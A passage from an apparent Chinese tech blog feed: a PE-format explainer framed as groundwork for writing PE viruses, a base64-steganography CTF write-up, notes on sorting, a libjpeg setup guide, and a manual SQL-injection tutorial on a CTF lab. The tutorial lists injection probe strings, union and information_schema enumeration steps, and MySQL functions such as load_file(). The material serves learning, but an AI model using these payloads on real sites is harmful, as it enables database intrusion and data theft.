IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>Name：输入的DLL的名字指针，它是一个以00结尾的ASCII字符的RVA地址，该字符串包含输入的DLL名。例如：KERNEL32.DLL，或者USER32.DLL。<br>FirstThunk：包含指向输入地址表（IAT）的RVA。IAT也是指向IAMGE_THUNK_DATA结构，他的格式如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_THUNK_DATA32 &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        DWORD ForwarderString;      &#x2F;&#x2F; PBYTE </span><br><span class="line">        DWORD Function;             &#x2F;&#x2F; PDWORD</span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        DWORD AddressOfData;        &#x2F;&#x2F; PIMAGE_IMPORT_BY_NAME</span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line">typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><p>ForwarderString 指向一个转向者字符串的RVA；<br>Function 被输入的函数的内存地址<br>Ordinal 被输入的API的序数值<br>AddressOfData又指向一个IMAGE_IMPORT_BY_NAME的数据结构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_IMPORT_BY_NAME &#123;</span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[1];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>Hint字段：指示本函数在其所驻留的输出表的中序号该域被PE装载器用来在DLL的输出表里快速查询。该值不是必须的，一些链接器将此值设为0；<br>NAME字段：这个字段比较重要。它含有输入函数的函数名，函数名是一个ASCII码字符串，并以NULL结尾。注意，这里虽然将NAME的大小定义为字节，其实他是可变的。</p><p>通过上面的了解大概我们都会疑惑<strong>为什么这两个数组都要指向IMAGR_IMPORT_BY_NAME结构？</strong>原因如下：<br>第一，第一个由OriginalFrist通过IMAGE_THUNK_DATA结构所指向的IMAGE_IMPORT_BY_NAME是单独的一项，而且IMAGE_THUNK_DATA的值不可以更改，这个IMAGE_THUNK_DATA组成的数组就是INT，其实它是为FristThunk做为提示用的。<br>第二，第二个由FristThunk所指向的IMAGE_THUNK_DATA的值是由PE装载器填写的，他们的值构成了IAT。PE装载器首先搜索OringinalFristThunk，通过它所指向的INT结构中的每个IMAGE_IMPORT_BY_NAME所指向的每个被载入函数的地址。然后通过加载器将值填充到FristThunk指向的IAT表中。可以简单粗暴地Firsttrunk理解为RVA。<br><img src="/2020/03/19/PE%E6%A0%BC%E5%BC%8F/1502566-20181019213913253-831418169.png" alt><br><img src="/2020/03/19/PE%E6%A0%BC%E5%BC%8F/1502566-20181019213929238-1718215134.png" alt></p><h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><p>顾名思义，是存放节表项的，相当于节的目录。<br>节表项包含 节名、节在文件和内存中的开始地址、长度、节属性等。<br><img src="/2020/03/19/PE%E6%A0%BC%E5%BC%8F/5.jpg" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    union &#123;</span><br><span class="line">            DWORD   PhysicalAddress;    </span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;                  &#x2F;&#x2F; 节区的 RVA 地址</span><br><span class="line">    DWORD   SizeOfRawData;                   &#x2F;&#x2F; 在文件中对齐后的尺寸</span><br><span class="line">    DWORD   PointerToRawData;                &#x2F;&#x2F; 在文件中的偏移量</span><br><span class="line">    DWORD   PointerToRelocations;            &#x2F;&#x2F; 在OBJ文件中使用，重定位的偏移</span><br><span class="line">    DWORD   PointerToLinenumbers;            &#x2F;&#x2F; 行号表的偏移（供调试使用地）</span><br><span class="line">    WORD    NumberOfRelocations;             &#x2F;&#x2F; 在OBJ文件中使用，重定位项数目</span><br><span class="line">    WORD    NumberOfLinenumbers;             &#x2F;&#x2F; 行号表中行号的数目</span><br><span class="line">    DWORD   Characteristics;                 &#x2F;&#x2F; 节属性如可读，可写，可执行</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>可能大家会有疑问，virtualaddress和pointertorawdata的区别是什么，其实很简单，VirtualAddress是指内存中的rva（相对虚地址），PointerToRawData是指文件中的偏移</p><h3 id="节属性"><a href="#节属性" class="headerlink" title="节属性"></a>节属性</h3><p>0x00000020? 这个块包含代码。置位<br>0x00000040? 这个块包含已初始化的数据<br>0x00000080? 这个块包含未初始化的数据（如.bss 块）<br>0x00000200? 这个块包含注释或其它的信息。<br>0x00000800? 这个块的内容不应放进最终的EXE文件中。<br>0x02000000? 这个块可以被丢弃，因为一旦它被载入，其进程就不需要它。最通常的可丢弃块是基本重定位块（.reloc ）。<br>0x10000000? 这个块是可共享的。<br>0x20000000? 这个块是可执行的。<br>0x40000000? 这个块是可读的。<br>0x80000000? 这个块是可写的。</p><h2 id="节"><a href="#节" class="headerlink" title="节"></a>节</h2><p>节就是程序主体了，一般PE文件有很多节，比较常见的有<br>代码节<br>数据节<br>引入函数节<br>资源节等(如图标)<br>引出函数节（DLL文件中常见）<br>重定位节（DLL文件中常见）</p><h1 id="PE程序执行流程"><a href="#PE程序执行流程" class="headerlink" title="PE程序执行流程"></a>PE程序执行流程</h1><p>PE程序主要依赖PE程序装载器，在检查了头部信息（包括引入函数表的地址信息装入等等）之后会读取节表，根据节表来动态的将各节的内容装入内存中。这个过程中会自动的修改代码段中的jmp的地址值使它能够成功。<br>这点儿知识对下个PE病毒编写有好处，尽请期待。</p><p>参考：<br><a href="https://blog.csdn.net/qq_40422314/article/details/89741040">https://blog.csdn.net/qq_40422314/article/details/89741040</a><br><a href="https://www.cnblogs.com/2f28/p/9800992.html">https://www.cnblogs.com/2f28/p/9800992.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;如果你想学习PE病毒的编写，那么你首先得知道PE的格式和他的工作原理。&lt;/p&gt;</summary>
    
    
    
    
    <category term="计算机基础" scheme="https://blog.pillar.fun/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记_base64隐写</title>
    <link href="https://blog.pillar.fun/2020/03/18/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-base64%E9%9A%90%E5%86%99/"/>
    <id>https://blog.pillar.fun/2020/03/18/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-base64%E9%9A%90%E5%86%99/</id>
    <published>2020-03-18T04:59:35.000Z</published>
    <updated>2022-02-21T11:50:20.033Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="ACTF新生赛2020-base64隐写1"><a href="#ACTF新生赛2020-base64隐写1" class="headerlink" title="[ACTF新生赛2020]base64隐写1"></a>[ACTF新生赛2020]base64隐写1</h1><p>打开解压后是一个提示和一个ComeOn!.txt，其中全是base64加密的一行一行的内容，如果我们用base64解码，会发现是一个c的源文件。hint是一个微信公众号……不如直接去找</p><h2 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h2><p>假设你理解了base64的原理（应该都理解吧），如果我们要加密的内容不能被6整除的话，我们需要加为0的padding，并在末尾加上等号，在解码的时候会根据等号的个数删去密文的二进制的最后几位。因此我们在padding中可以隐藏信息，反正在解码的时候都会被舍去。</p><p>由此我们可以写脚本提取其中的隐写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ComeOn!.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="built_in">str</span>(line, <span class="string">&quot;utf-8&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        rowb64 = <span class="built_in">str</span>(base64.b64encode(base64.b64decode(stegb64)), <span class="string">&quot;utf-8&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]) - b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>)  <span class="comment"># no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># flag += chr(int(bin(offset)[2:].zfill(equalnum * 2), 2))</span></span><br><span class="line">            <span class="comment"># print(flag) 这样写得不出正确结果</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += <span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    print(res_str)</span><br></pre></td></tr></table></figure><p>即可得到答案ACTF{6aseb4_f33!}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>排序算法</title>
    <link href="https://blog.pillar.fun/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
    <id>https://blog.pillar.fun/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</id>
    <published>2020-03-13T10:35:57.000Z</published>
    <updated>2021-03-24T05:00:17.973Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>排序算法是非常基础常用的算法，简单总结一下。<br>注：没有代码！没有代码！没有代码！只有思路</p><a id="more"></a><p><img src="/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/1.jpg" alt><br>这个youtuber传了几个有趣的3d动画的排序时间复杂度对比，有条件的胖友可以去康康<br><a href="https://www.youtube.com/user/udiprod">https://www.youtube.com/user/udiprod</a></p><h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>k：桶个数<br>in-place：不占用额外内存<br>out-place：占用额外内存</p><h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><p>每轮从头开始比较相邻的元素，如果第一个比第二个大（小），就交换位置，否则不交换，这样就可以使最大（小）的元素在数组的尾部。第i轮可以将第i大（小）的元素放在倒数第i位。同时如果在第i轮发现没有任何元素交换位置就说明已经排序成功。<br><img src="/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/2.gif" alt><br>最优时间复杂度在整个数组恰好顺序于所需要的顺序，只需要扫描第一遍就能发现是没有交换位置，也就是说明排序成功了。T(n)=n=O(n)<br>最差时间复杂度在整个数组恰好倒序于所需要的顺序，T(n)=(n-1)+(n-2)+……+1=(n-2)*n/2=O($n^2$)<br>平均情况是O($n^2$)</p><h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><p>每一轮都扫描全部的元素，找到最大(小)的那个元素，然后把它和未排序序列的第一个（也就是已排序序列的下一个）交换位置。<br><img src="/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/3.gif" alt><br>因为他每一轮其实不管未排序序列的情况如何，都需要挨个比较一边，所以他的复杂度稳定，永远是O($n^2$)</p><h1 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h1><p>插入排序将整个序列分为有序部分和无序部分两个部分，开始时有序部分为空，而无序部分为整个序列。<br>在每一轮，拿出无序部分的第一个元素，在有序部分中找到他应该在的位置插入，使得有序部分仍保持有序。<br><img src="/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/1.gif" alt><br>最优时间复杂度在整个数组恰好顺序于所需要的顺序，每一次拿一个无序序列的元素就能直接一步到胃插入到对的位置，T(n)=n=O(n)<br>最差时间复杂度在整个数组恰好倒序于所需要的顺序，每次拿到元素都要扫描整个有序序列才能找到对的位置。T(n)=(n-1)+(n-2)+……+1=(n-2)*n/2=O($n^2$)<br>平均情况是O($n^2$)</p><h1 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h1><p>希尔排序是非常有地位的一个算法，由希尔在1959年提出，它的基本思想也是插入排序，但经过了优化改进之后使得它的复杂度突破了O($n^2$)。希尔排序又叫缩小增量排序<br>希尔排序的思想是将整个待排序的序列依据一定的增量来分组，对每一组采用直接插入排序的方式来排序，然后缩小增量再次分组，然后再次排序，如此循环。在经典的希尔排序里，这个增量是2/n,4/n,8/n……<br><img src="/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/5.jpg" alt><br>每经过一轮分组，整个序列就会越趋向于有序，也就是在下一轮时分组内的插入排序会趋向于简单。<br>可以把算法看成两个步骤，第一个步骤是分组，第二个步骤是插入排序。<br>分组的时间复杂度都是$\log_2{n}$，因此评价希尔排序的最优和最劣主要还是看直接插入排序过程里的复杂度。<br><img src="/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/6.jpg" alt><br>迄今为止，还无法从理论上精准地分析希尔排序的效率，有各种各样基于试验的评估，估计它的时间级介于O(N3/2)与O(N7/6)之间。我们可以认为希尔排序的平均时间复杂度为O(N<em>(logN)2)。专家们提倡，几乎任何排序工作在开始时都可以用希尔排序，若在实际使用中证明它不够快，再改成快速排序这样更高级的排序算法。<br>然而，Donald Knuth提出使用h=3</em>h+1的序列让增量之间互质可以有效的提高效率。</p><h1 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h1><p>归并排序使用了分治思想，分治就是“分而治之”，将大问题细分为小问题，将序列分为小的子序列，将每个子序列变得有序，然后在合并有序的子序列，最终使得整个序列都有序。<br>经典的归并排序即二路归并，首先将整个序列分为两个n/2长度的子序列，对每个子序列再二分，一直分到序列只有一个元素，自然有序为止。这是归并中的“归”：归一<br>然后在对子序列进行归并中的“并”：合并<br>因为两个子序列都是有序的，因此我们可以很快地将两个子序列合并成有序的一个序列。<br><img src="/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/7.gif" alt><br>最佳情况全部有序，只有在合并过程中的一次次比较扫描了整个序列，因此复杂度为T(n)=$\log_2{n}$+n=O(n)<br>最差情况全部无序，每一次合并都全部扫描，复杂度为O($n\log_2{n}$)<br>平均情况是O($n\log_2{n}$)</p><h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><p>快速排序首先选择一个元素作为基准，然后将剩下的所有元素分为比基准大的元素们和比基准小的元素们，然后将基准差在他们俩中间，然后分别对这两个部分进行快速排序。<br><img src="/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/8.gif" alt><br>在最优情况下，Partition每次都划分得很均匀，如果排序n个关键字，其递归树的深度就为.log2n.+1（.x.表示不大于x的最大整数），即仅需递归log2n次，需要时间为T（n）的话，第一次Partiation应该是需要对整个数组扫描一遍，做n次比较。然后，获得的枢轴将数组一分为二，那么各自还需要T（n/2）的时间（注意是最好情况，所以平分两半）。于是不断地划分下去，我们就有了下面的不等式推断。<br>T（n）≤2T（n/2） +n，T（1）=0<br>T（n）≤2（2T（n/4）+n/2） +n=4T（n/4）+2n<br>T（n）≤4（2T（n/8）+n/4） +2n=8T（n/8）+3n<br>……<br>T（n）≤nT（1）+（log2n）×n= O(nlogn)<br>此时复杂度为O($n\log_2{n}$)<br>最差情况下，每次划分只得到一个比上一次划分少一个记录的子序列，直接退化为冒泡排序，复杂度O($n^2$)<br>平均情况O($n\log_2{n}$)</p><h1 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h1><p>堆排序是依据堆的数据结构而设计的一种算法。堆是一个近似完全二叉树的结构，并且子节点的键值或索引总是小于（或大于）它的父节点。<br>堆排序就是将待排序按照树的结构插进去，然后用堆的组成算法把它变成一个大顶堆。然后根据这个大顶堆的性质，根节点是最大的，所以我们把它掏出来，让最底层的节点放在根节点上，这时显然这个堆不是一个堆（？），所以再利用堆的操作将他变成正确的堆，这也就将最大的节点又放在了根节点上。<br><img src="/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/9.gif" alt><br>最优、最劣、平均算法复杂度都为O($n\log_2{n}$)</p><h1 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h1><p>计数排序是利用一段新的内存空间来加快存储的，是非常经典的空间复杂度换时间复杂度的算法。它将输入的数据当做键来存储在相应的数组之中，具体过程如下。<br>首先申请一个长度为k的数组a，k为输入元素的最大值和最小值的差（后面假设从0开始），然后扫描待排序数组，将大小为i的数字放在a[i]处。<br>然后从前往后扫描a数组，从第二个开始，a[i]+=a[i-1]，这样就使a[i]的意义从“大小为i的数字的个数”变成了“小于等于i的数字的个数”<br>然后再从后往前的将a数组里的数字掏出来，这么做是为了保持算法的稳定性。<br><img src="/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/10.gif" alt><br>作为用空间换时间的算法，它的时间复杂度为T(n) = O(n+k)，k为多申请的数组大小。</p><h1 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h1><p>桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。<br>将数据分到有限数量的桶里，每个桶再分别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排序）<br>这张图一放就能看懂了<br><img src="/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/11.jpg" alt><br>复杂度同样如计数排序O(n+k)</p><h1 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h1><p>基数排序就是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。基数排序基于分别排序，分别收集，所以是稳定的。<br><img src="/2020/03/13/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/12.gif" alt><br>每轮一位都需要n次运算，所以时间复杂度为O(kn)（k指待排序的数最大有多少位）当然他也需要额外空间。</p><p>参考：<br><a href="https://blog.csdn.net/weixin_41190227/article/details/86600821">https://blog.csdn.net/weixin_41190227/article/details/86600821</a><br><a href="https://blog.csdn.net/ginnosx/article/details/12263619">https://blog.csdn.net/ginnosx/article/details/12263619</a><br><a href="https://www.cnblogs.com/mark-meng/p/6045882.html">https://www.cnblogs.com/mark-meng/p/6045882.html</a><br><a href="https://blog.csdn.net/weshjiness/article/details/8660583">https://blog.csdn.net/weshjiness/article/details/8660583</a><br><a href="https://blog.csdn.net/liyue199512/article/details/52149489">https://blog.csdn.net/liyue199512/article/details/52149489</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;排序算法是非常基础常用的算法，简单总结一下。&lt;br&gt;注：没有代码！没有代码！没有代码！只有思路&lt;/p&gt;</summary>
    
    
    
    
    <category term="算法" scheme="https://blog.pillar.fun/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>vs2017安装libjpeg库</title>
    <link href="https://blog.pillar.fun/2020/03/12/vs2017%E5%AE%89%E8%A3%85libjpeg%E5%BA%93/"/>
    <id>https://blog.pillar.fun/2020/03/12/vs2017%E5%AE%89%E8%A3%85libjpeg%E5%BA%93/</id>
    <published>2020-03-12T06:38:12.000Z</published>
    <updated>2020-05-30T05:11:28.506Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>libjpeg对jpeg的功能实在是太强大了，下面简单介绍一下怎么在VS2017下安装使用。</p><a id="more"></a><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><a href="http://www.ijg.org/">http://www.ijg.org/</a><br>windows平台选择zip即可</p><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>我们是在windows平台下，所以要么使用cmake要么使用nmake，但是我们又有VS2017，因此我们可以使用VS2017的nmake（如果你在安装的时选择工具集的时候选择了C++的桌面开发的话他是已经准备好的，当然你也可以亲自去下个cmake或者nmake）<br><img src="/2020/03/12/vs2017%E5%AE%89%E8%A3%85libjpeg%E5%BA%93/1.png" alt><br>首先解压，在一大堆文件中将jconfig.vc改名为jconfig.h<br>然后打开makefile.vc,把里面的win32.mak换成自己电脑上的win32.mak的路径，或者直接把win32.mak复制一个到这个文件夹下。<br>这里有的人可能没有win32.mak这个东西，好像是因为win10系统的VS都没有。因此放个链接自取<br><a href="https://github.com/nurmi-labs/ms-sdk">https://github.com/nurmi-labs/ms-sdk</a><br>然后打开VS命令行，cd到解压的位置，然后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmake -f makefile.vc</span><br></pre></td></tr></table></figure><p>至此，解压就完成了。</p><h1 id="在VS2017中引入libjpeg"><a href="#在VS2017中引入libjpeg" class="headerlink" title="在VS2017中引入libjpeg"></a>在VS2017中引入libjpeg</h1><p>理论上我们只需要编译后的文件，但是我比较懒我就直接把全部的都存起来了，然后在VS的项目-属性-配置属性-VC++目录的可执行文件目录 以及库文件目录都添上编译好的那个文件夹的位置<br><img src="/2020/03/12/vs2017%E5%AE%89%E8%A3%85libjpeg%E5%BA%93/2.jpg" alt><br>然后再在链接器-输入-附加依赖项添加一个libjpeg<br>即可。<br><img src="/2020/03/12/vs2017%E5%AE%89%E8%A3%85libjpeg%E5%BA%93/3.jpg" alt><br>在引入时，使用# include&lt;jpeglib&gt;即可。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;libjpeg对jpeg的功能实在是太强大了，下面简单介绍一下怎么在VS2017下安装使用。&lt;/p&gt;</summary>
    
    
    
    
    <category term="图像处理" scheme="https://blog.pillar.fun/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>SQL手注</title>
    <link href="https://blog.pillar.fun/2020/03/08/SQL%E6%89%8B%E6%B3%A8/"/>
    <id>https://blog.pillar.fun/2020/03/08/SQL%E6%89%8B%E6%B3%A8/</id>
    <published>2020-03-08T04:14:52.000Z</published>
    <updated>2020-05-30T05:47:34.047Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>SQL注入漏洞作为臭名昭著的漏洞，已经有很多全自动攻击的工具了，但是我们是优秀的同学，我们要会用工具，还知道工具的原理。</p><a id="more"></a><h1 id="寻找SQL注入漏洞"><a href="#寻找SQL注入漏洞" class="headerlink" title="寻找SQL注入漏洞"></a>寻找SQL注入漏洞</h1><p>SQL注入常常出现在可以传递参数的位置，包括URL参数、搜索框、目录名、文件名等等，很多马虎的管理者因为对参数的过滤不严导致被攻击者所利用。<br>常见判断是否存在注入的语句有<br>数字型：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and 1&#x3D;1&#x2F;and 1&#x3D;2</span><br><span class="line">or 1&#x3D;1&#x2F;or 1&#x3D;2</span><br><span class="line">\+ \- \* &#x2F; \&gt; &lt; &lt; &#x3D; \&gt; &#x3D; \*</span><br><span class="line">1 like1&#x2F;1 like 2</span><br></pre></td></tr></table></figure><p>字符型：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and &#39;1&#39;&#x3D;&#39;1 &#x2F;and &#39;1&#39;&#x3D;&#39;2</span><br><span class="line">or &#39;1&#39;&#x3D;&#39;1&#x2F;or &#39;1&#39;&#x3D;&#39;2</span><br><span class="line">+&#39; &#x2F;+&#39; -&#39; &#x2F;-&#39; \&gt; &lt; &lt;&#x3D; \&gt;&#x3D;</span><br><span class="line">1&#39; like &#39;1&#x2F;1&#39; like &#39;2</span><br></pre></td></tr></table></figure><p>只要我们对sql语句的掌握够深，类似的判断语句还很多</p><h1 id="实战学习"><a href="#实战学习" class="headerlink" title="实战学习"></a>实战学习</h1><p>用了<a href="https://www.ctfhub.com/">ctfhub</a>的sql注入题目。<br>首先整数型注入，按照提示输入个1<br><img src="/2020/03/08/SQL%E6%89%8B%E6%B3%A8/TIM%E6%88%AA%E5%9B%BE20200308171041.jpg" alt><br>下面也显示了对应的语句，但是我们发现他是select *，我们的注入语句是显示所有的查找到的条目，可是这里只返回了一条语句，猜测经过处理只显示一个条目。于是我们使用limit来验证猜测<br><img src="/2020/03/08/SQL%E6%89%8B%E6%B3%A8/TIM%E6%88%AA%E5%9B%BE20200308174015.jpg" alt><br>这条语句理论上应该返回3个条目或者报错，然而却只返回一个条目，因此我们的猜测是正确的。解决的问题也简单，我们只要输入一个不存在的id，这时后端查找到的是NULL，于是就可以显示我们的union select的内容了。<br>接下来我们使用order by来判断条目的字段数量。<br><img src="/2020/03/08/SQL%E6%89%8B%E6%B3%A8/TIM%E6%88%AA%E5%9B%BE20200308174419.jpg" alt><br><img src="/2020/03/08/SQL%E6%89%8B%E6%B3%A8/TIM%E6%88%AA%E5%9B%BE20200308174308.jpg" alt><br>在3的时候就没有回显了，我们也可以判断出后端做了处理不显示报错信息。<br>接下来我们应该使用union来判断条目的字段对应显示在那个位置，但是我们一共就俩字段，可以判断，但没必要。<br>直接看数据库名<br><img src="/2020/03/08/SQL%E6%89%8B%E6%B3%A8/TIM%E6%88%AA%E5%9B%BE20200308175018.jpg" alt><br>得到数据库的名字是sqli<br>然后information_schema3连<br><img src="/2020/03/08/SQL%E6%89%8B%E6%B3%A8/TIM%E6%88%AA%E5%9B%BE20200308174914.jpg" alt><br><img src="/2020/03/08/SQL%E6%89%8B%E6%B3%A8/TIM%E6%88%AA%E5%9B%BE20200308175140.jpg" alt><br><img src="/2020/03/08/SQL%E6%89%8B%E6%B3%A8/TIM%E6%88%AA%E5%9B%BE20200308175324.jpg" alt><br>顺利得到flag。</p><h1 id="常见的获取敏感信息的函数"><a href="#常见的获取敏感信息的函数" class="headerlink" title="常见的获取敏感信息的函数"></a>常见的获取敏感信息的函数</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user()                      数据库用户名</span><br><span class="line">current_user()              当前数据库用户名</span><br><span class="line">database()                  数据库名</span><br><span class="line">version()                   MYSQL数据库版本</span><br><span class="line">@@datadir                   读取数据库路径</span><br><span class="line">@@basedir                   MYSQL安装路径</span><br><span class="line">@@version_compile_os        获取操作系统版本</span><br><span class="line">load_file()                 MYSQL读取本地文件的函数</span><br></pre></td></tr></table></figure><h1 id="举一反三"><a href="#举一反三" class="headerlink" title="举一反三"></a>举一反三</h1><p>那么我们就基本可以总结书sql注入的普遍思路了。</p><ol><li>判断是否有注入点</li><li>使用order by来判断返回的条目的字段数量</li><li>使用union判断每个字段的显示位置</li><li>使用database()等函数获取有用的信息</li><li>大声叫喊奥利给！</li></ol><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>盲注和注入的最大区别在于他不会返回给你东西，只会在出错的时候报错或者显示不正常，因此盲注的payload通常类似下面<br>id=1 and (select 